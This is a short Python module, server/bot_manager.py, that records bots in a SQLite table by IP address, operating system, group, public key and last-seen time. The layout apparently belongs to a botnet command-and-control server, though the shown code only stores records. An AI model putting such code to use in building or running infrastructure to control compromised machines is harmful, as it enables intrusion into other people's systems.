# server/bot_manager.py
from .config import Config
import sqlite3
import logging
from datetime import datetime

def register_bot(bot_ip, bot_os, group, public_key):
    try:
        conn = sqlite3.connect(Config.DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO bots (ip, os, last_seen, group_name, public_key) VALUES (?, ?, ?, ?, ?)",
                  (bot_ip, bot_os, datetime.now(), group, public_key))
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(f"Error registering bot: {e}")
